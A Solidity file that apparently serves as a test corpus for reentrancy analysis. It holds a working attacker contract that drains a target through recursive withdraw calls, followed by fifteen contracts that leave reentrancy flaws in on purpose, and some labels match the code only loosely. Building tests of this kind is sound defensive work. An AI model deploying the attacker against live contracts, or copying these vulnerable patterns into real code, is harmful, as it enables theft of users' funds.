// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/* -------------------- Shared Attacker Contract -------------------- */
contract AttackerTest {
    address payable public target;

    constructor(address _target) {
        target = payable(_target);
    }

    fallback() external payable {
        if (address(target).balance >= 1 ether) {
            (bool success, ) = target.call(abi.encodeWithSignature("withdraw(uint256)", 1 ether));
            require(success);
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        (bool success, ) = target.call{value: 1 ether}(abi.encodeWithSignature("deposit()"));
        require(success);
        (success, ) = target.call(abi.encodeWithSignature("withdraw(uint256)", 1 ether));
        require(success);
    }

    receive() external payable {}
}

/* -------------------- Test1: Basic Reentrancy -------------------- */
contract Test1 {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint256 _amount) public {
        require(balances[msg.sender] >= _amount);
        (bool sent, ) = msg.sender.call{value: _amount}("");
        require(sent);
        balances[msg.sender] -= _amount;
    }
}

/* -------------------- Test2: Fallback Reentrancy -------------------- */
contract Test2 {
    mapping(address => uint) public balance;

    function donate() external payable {
        balance[msg.sender] += msg.value;
    }

    function withdraw(uint _amount) external {
        if (balance[msg.sender] >= _amount) {
            (bool success,) = msg.sender.call{value: _amount}("");
            require(success);
            balance[msg.sender] -= _amount;
        }
    }
}

/* -------------------- Test3: Loop Reentrancy -------------------- */
contract Test3 {
    address[] public funders;
    mapping(address => uint) public balance;

    function contribute() external payable {
        funders.push(msg.sender);
        balance[msg.sender] += msg.value;
    }

    function refund() external {
        for (uint i = 0; i < funders.length; i++) {
            address funder = funders[i];
            if (balance[funder] > 0) {
                (bool sent, ) = funder.call{value: balance[funder]}("");
                require(sent);
                balance[funder] = 0;
            }
        }
    }
}

/* -------------------- Test4: Cross-function Reentrancy -------------------- */
contract Test4 {
    mapping(address => uint) public balance;

    function deposit() external payable {
        balance[msg.sender] += msg.value;
    }

    function trigger() public {
        withdraw(balance[msg.sender]);
    }

    function withdraw(uint amount) public {
        if (balance[msg.sender] >= amount) {
            (bool sent, ) = msg.sender.call{value: amount}("");
            require(sent);
            balance[msg.sender] -= amount;
        }
    }
}

/* -------------------- Test5: Modifier-based Reentrancy -------------------- */
contract Test5 {
    mapping(address => uint) public balance;

    modifier checkBalance(uint _amount) {
        if (_amount > 1 ether) {
            (bool sent, ) = msg.sender.call{value: 0.1 ether}("");
            require(sent);
        }
        _;
    }

    function deposit() external payable {
        balance[msg.sender] += msg.value;
    }

    function withdraw(uint _amount) external checkBalance(_amount) {
        require(balance[msg.sender] >= _amount);
        (bool sent, ) = msg.sender.call{value: _amount}("");
        require(sent);
        balance[msg.sender] -= _amount;
    }
}

/* -------------------- Test6: Nested Reentrancy -------------------- */
contract Test6 {
    mapping(address => uint) public balance;

    function deposit() public payable {
        balance[msg.sender] += msg.value;
    }

    function withdraw() public {
        internalWithdraw(msg.sender, balance[msg.sender]);
    }

    function internalWithdraw(address user, uint amt) internal {
        (bool success, ) = user.call{value: amt}("");
        require(success);
        balance[user] = 0;
    }
}

/* -------------------- Test7: Delegatecall Reentrancy -------------------- */
contract ReentrantLogic {
    function callBack(address user) public {
        (bool sent, ) = user.call{value: 0.5 ether}("");
        require(sent);
    }
}

contract Test7 {
    mapping(address => uint) public balance;
    address logic;

    constructor(address _logic) {
        logic = _logic;
    }

    function deposit() public payable {
        balance[msg.sender] += msg.value;
    }

    function withdraw() public {
        balance[msg.sender] = 0;
        logic.delegatecall(abi.encodeWithSignature("callBack(address)", msg.sender));
    }
}

/* -------------------- Test8: Receive Function Reentrancy -------------------- */
contract Test8 {
    mapping(address => uint) public balance;

    function deposit() public payable {
        balance[msg.sender] += msg.value;
    }

    function withdraw() public {
        (bool success, ) = msg.sender.call{value: balance[msg.sender]}("");
        require(success);
        balance[msg.sender] = 0;
    }

    receive() external payable {}
}

/* -------------------- Test9: Storage Collision -------------------- */
contract Parent {
    uint public num;
}

contract Test9 is Parent {
    mapping(address => uint) public balances;

    function deposit() public payable {
        balances[msg.sender] = msg.value;
    }

    function withdraw() public {
        (bool success, ) = msg.sender.call{value: balances[msg.sender]}("");
        require(success);
        balances[msg.sender] = 0;
    }
}

/* -------------------- Test10: Proxy Reentrancy -------------------- */
contract Proxy {
    address public impl;

    constructor(address _impl) {
        impl = _impl;
    }

    fallback() external payable {
        (bool success, ) = impl.delegatecall(msg.data);
        require(success);
    }
}

contract LogicVuln {
    mapping(address => uint) public balance;

    function deposit() public payable {
        balance[msg.sender] += msg.value;
    }

    function withdraw() public {
        (bool sent, ) = msg.sender.call{value: balance[msg.sender]}("");
        require(sent);
        balance[msg.sender] = 0;
    }
}

contract Test10 is Proxy {
    constructor(address _impl) Proxy(_impl) {}
}

/* -------------------- Test11: Gas Stipend Reentrancy -------------------- */
contract Test11 {
    mapping(address => uint) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        (bool sent, ) = msg.sender.call{value: balances[msg.sender]}(""); // Full gas
        require(sent);
        balances[msg.sender] = 0;
    }
}

/* -------------------- Test12: Fallback Deposit Reentrancy -------------------- */
contract Test12 {
    mapping(address => uint) public balance;

    function withdraw(uint amt) public {
        (bool sent, ) = msg.sender.call{value: amt}("");
        require(sent);
        balance[msg.sender] -= amt;
    }

    fallback() external payable {
        balance[msg.sender] += msg.value;
    }
}

/* -------------------- Test13: Flash Loan Reentrancy -------------------- */
contract Test13 {
    mapping(address => uint) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function flashLoan(uint amount) public {
        require(address(this).balance >= amount);
        (bool sent, ) = msg.sender.call{value: amount}("");
        require(sent);
        require(address(this).balance >= balances[msg.sender], "Loan not repaid");
    }
}

/* -------------------- Test14: MultiSend Reentrancy -------------------- */
contract Test14 {
    mapping(address => uint) public balance;

    function deposit() external payable {
        balance[msg.sender] += msg.value;
    }

    function multiWithdraw(address[] memory users) external {
        for (uint i = 0; i < users.length; i++) {
            (bool sent, ) = users[i].call{value: balance[users[i]]}("");
            require(sent);
            balance[users[i]] = 0;
        }
    }
}

/* -------------------- Test15: Auction Reentrancy -------------------- */
contract Test15 {
    address public highestBidder;
    uint public highestBid;

    mapping(address => uint) public refunds;

    function bid() external payable {
        require(msg.value > highestBid);

        if (highestBidder != address(0)) {
            refunds[highestBidder] += highestBid;
        }

        highestBidder = msg.sender;
        highestBid = msg.value;
    }

    function claimRefund() public {
        uint refund = refunds[msg.sender];
        if (refund > 0) {
            (bool sent, ) = msg.sender.call{value: refund}("");
            require(sent);
            refunds[msg.sender] = 0;
        }
    }
}
